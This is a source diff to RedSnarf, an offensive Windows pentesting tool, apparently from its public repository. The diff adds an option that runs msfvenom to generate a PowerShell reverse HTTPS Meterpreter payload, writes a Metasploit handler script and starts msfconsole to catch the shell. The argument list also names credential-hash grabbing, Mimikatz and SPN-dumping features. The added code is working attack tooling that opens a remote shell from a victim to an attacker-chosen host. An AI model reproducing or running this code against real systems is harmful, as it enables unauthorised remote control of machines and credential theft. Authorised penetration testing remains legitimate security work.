@@ -1626,7 +1626,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.3k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1649,6 +1649,7 @@ ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="
 ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
 ugroup.add_argument("-uL", "--lockdesktop", dest="lockdesktop", default="", help="<Optional> Lock remote users Desktop")
 ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
+ugroup.add_argument("-uMT", "--meterpreter_revhttps", dest="meterpreter_revhttps", default="", help="<Optional> Launch Reverse Meterpreter HTTPS")
 ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 ugroup.add_argument("-uS", "--get_spn", dest="get_spn", default="n", help="<Optional> Get SPN's from DC")
@@ -1747,6 +1748,7 @@ john_to_pipal=args.john_to_pipal
 get_spn=args.get_spn
 win_scp=args.win_scp
 lockdesktop=args.lockdesktop
+meterpreter_revhttps=args.meterpreter_revhttps
 
 #Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
 #in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
@@ -1773,6 +1775,58 @@ if c_password!='':
 		sys.exit()
 	except:
 		sys.exit()
+
+#Generates Powershell Meterpreter Reverse HTTPS Code and starts a Meterpreter Listener
+if meterpreter_revhttps in yesanswers:
+	try:			
+		print colored("[+]Generating Meterpreter Reverse HTTPS Powershell Code & Listener:\n",'green')
+		
+		print colored("[+] IP Address of eth0 is "+get_ip_address('eth0'),'yellow')
+		if get_ip_address('tap0')!="":
+			print colored("[+] IP Address of tap0 is "+get_ip_address('tap0'),'yellow')
+
+		my_ip = raw_input("\nPlease enter IP to listen on: (q to quit): ")
+		if my_ip=="q":
+			sys.exit()
+		
+		usr_port = raw_input("\nPlease enter port to listen on: (q to quit): ")
+		if usr_port=="q":
+			sys.exit()	
+
+		if usr_port !="":
+			proc = subprocess.Popen("msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 LHOST="+my_ip+" LPORT="+usr_port+" -o /tmp/mt.ps1 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()
+			#print proc.communicate()[0]
+
+			if os.path.isfile('/tmp/mt.ps1'):
+				print colored("[+]Powershell code successfully generated and located in /tmp/mt.ps1",'yellow')
+			else:
+				print colored("[-]Somthing went wrong generating reverse https meterpreter",'red')
+				sys.exit()
+				
+		usr_response = raw_input("\nAre you ready to start a listener: ")
+		
+		if usr_response in yesanswers:
+			
+			fout=open('/tmp/revshell.rb','w')
+			fout.write('use exploit/multi/handler \n')
+			fout.write('set payload windows/meterpreter/reverse_https\n')
+			fout.write('set lhost '+my_ip+'\n')
+			fout.write('set lport '+usr_port+'\n')
+			fout.write('exploit -j\n')
+			fout.close() 
+			
+			os.system("msfconsole -q -r /tmp/revshell.rb")
+
+		sys.exit()
+			
+	except OSError:
+		print colored("[-]Something went wrong Generating Meterpreter Reverse HTTPS Code & Listener",'red')
+		logging.error("[-]Something went wrong Generating Meterpreter Reverse HTTPS Code & Listener")
+
+	else:
+		print colored ('\n[-]It is only possible to use this technique on a single target and not a range','red')
+		sys.exit()
+
 
 #Parse the ip to see if we are dealing with a single ip, a range or a file with multiple ips
 targets=[]
@@ -1804,6 +1858,7 @@ elif remotetargets[0:6]=='range=':
 		
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
+
 
 #Routine locks a remote users desktop
 if lockdesktop in yesanswers:
